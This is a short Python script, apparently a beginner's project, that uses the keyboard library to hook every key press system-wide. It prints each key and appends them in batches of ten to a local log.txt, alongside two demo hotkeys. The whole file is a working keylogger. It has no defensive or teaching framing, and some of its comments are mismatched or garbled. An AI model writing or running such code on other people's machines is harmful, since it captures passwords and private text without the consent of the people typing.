import keyboard

keys = [] #initializes the list of 10 keys to send to log.txt when limit is reached

def hotkey2(): #unique function for hotkey
    print("ctrl + shift + z was pressed")
keyboard.add_hotkey('ctrl + shift + z', hotkey2) #creates hotkey1 when shift+ctrl+z is pressed

def hotkey1():#second unique function for hotkey
    print("Space was pressed")
keyboard.add_hotkey('space', hotkey1) #creates hotkey2 when shift+s is pressed

def key_pressed(event): #creates event handler function when key is pressed
    key = (event.name) #creates a key object for each key pressed
    file = open("log.txt", "a") #opens text file in append mode
    print("Key pressed: " + key) #standard print call for key pressed
    keys.append(event.name) #appends to growing list

    if len(keys) == 10: #when list is 10 the loop will write to the file log.txt
        for element in keys:
            file.write(element)
        file.write("\n") #makes sure each entry is on a new line
        keys.clear() #clears array for the next 10 elements pressed
    file.close() #closes the file

keyboard.on_press(key_pressed) #event handler for when key pressed to call the function made above12234567890
keyboard.wait() #waits for next key pressed





